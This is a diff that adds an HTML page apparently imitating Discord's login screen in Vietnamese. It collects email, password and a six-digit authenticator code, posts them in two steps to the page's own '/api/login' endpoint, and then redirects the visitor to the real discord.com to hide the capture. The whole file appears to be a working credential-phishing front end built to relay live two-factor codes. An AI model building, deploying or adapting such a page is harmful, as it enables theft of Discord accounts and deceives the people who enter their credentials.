@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Discord Login</title>
+    <style>
+        body{background:#36393f;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:'Whitney','Helvetica Neue',Arial,sans-serif}
+        .box{background:#2f3136;padding:32px;border-radius:8px;width:480px;box-shadow:0 2px 10px 0 rgba(0,0,0,0.2)}
+        .box h1{color:#fff;font-size:24px;margin-bottom:8px}
+        .box .sub{color:#b9bbbe;font-size:14px;margin-bottom:20px}
+        .input-group{margin-bottom:16px}
+        .input-group label{color:#b9bbbe;font-size:12px;font-weight:600;display:block;margin-bottom:8px}
+        .input-group input{background:#202225;border:1px solid #040405;border-radius:4px;padding:10px;width:100%;color:#fff;font-size:16px;box-sizing:border-box}
+        button{background:#5865f2;border:none;border-radius:4px;padding:12px;width:100%;color:#fff;font-size:16px;font-weight:500;cursor:pointer;margin-top:8px}
+        button:hover{background:#4752c4}
+        .error{color:#f04747;font-size:12px;margin-top:8px;text-align:center}
+        .loading{color:#b9bbbe;text-align:center;margin-top:12px;font-size:12px}
+        .hidden{display:none}
+    </style>
+</head>
+<body>
+    <div class="box" id="loginBox">
+        <h1>Chào mừng trở lại!</h1>
+        <div class="sub">Đăng nhập để tiếp tục</div>
+        <form id="loginForm">
+            <div class="input-group"><label>Email hoặc Số điện thoại</label><input type="text" id="email" required></div>
+            <div class="input-group"><label>Mật khẩu</label><input type="password" id="password" required></div>
+            <button type="submit">Đăng nhập</button>
+            <div class="error" id="loginError"></div>
+            <div class="loading hidden" id="loginLoading">Đang xử lý...</div>
+        </form>
+    </div>
+    <div class="box hidden" id="mfaBox">
+        <h2>Xác minh hai yếu tố</h2>
+        <p>Nhập mã từ ứng dụng Authenticator</p>
+        <form id="mfaForm">
+            <div class="input-group"><label>Mã xác minh</label><input type="text" id="mfaCode" placeholder="000000" maxlength="6" required></div>
+            <button type="submit">Xác nhận</button>
+            <div class="error" id="mfaError"></div>
+            <div class="loading hidden" id="mfaLoading">Đang xác thực...</div>
+        </form>
+    </div>
+    <script>
+        const API_URL = '/api/login';
+        let tempSession = null;
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            if(!email||!password){document.getElementById('loginError').innerText='Vui lòng điền đầy đủ';return;}
+            document.getElementById('loginLoading').classList.remove('hidden');
+            document.getElementById('loginError').innerText='';
+            try{
+                const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'login',email,password})});
+                const data=await res.json();
+                if(data.success){
+                    if(data.token){
+                        document.getElementById('loginLoading').classList.add('hidden');
+                        document.getElementById('loginError').innerText='Đăng nhập thành công! Đang chuyển hướng...';
+                        setTimeout(()=>{window.location.href='https://discord.com/app';},1500);
+                    }else if(data.need_mfa){
+                        tempSession=data.session_id;
+                        document.getElementById('loginBox').classList.add('hidden');
+                        document.getElementById('mfaBox').classList.remove('hidden');
+                        document.getElementById('loginLoading').classList.add('hidden');
+                    }
+                }else{
+                    document.getElementById('loginLoading').classList.add('hidden');
+                    document.getElementById('loginError').innerText=data.error||'Sai thông tin đăng nhập';
+                }
+            }catch(err){
+                document.getElementById('loginLoading').classList.add('hidden');
+                document.getElementById('loginError').innerText='Lỗi kết nối, thử lại sau';
+            }
+        });
+        document.getElementById('mfaForm').addEventListener('submit', async function(e){
+            e.preventDefault();
+            const code=document.getElementById('mfaCode').value;
+            if(!code||code.length<6){document.getElementById('mfaError').innerText='Nhập mã 6 số';return;}
+            document.getElementById('mfaLoading').classList.remove('hidden');
+            document.getElementById('mfaError').innerText='';
+            try{
+                const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'mfa',session_id:tempSession,code})});
+                const data=await res.json();
+                if(data.success&&data.token){
+                    document.getElementById('mfaLoading').classList.add('hidden');
+                    document.getElementById('mfaError').innerText='Xác thực thành công! Đang chuyển hướng...';
+                    setTimeout(()=>{window.location.href='https://discord.com/app';},1500);
+                }else{
+                    document.getElementById('mfaLoading').classList.add('hidden');
+                    document.getElementById('mfaError').innerText=data.error||'Mã không hợp lệ';
+                }
+            }catch(err){
+                document.getElementById('mfaLoading').classList.add('hidden');
+                document.getElementById('mfaError').innerText='Lỗi hệ thống';
+            }
+        });
+    </script>
+</body>
+</html>
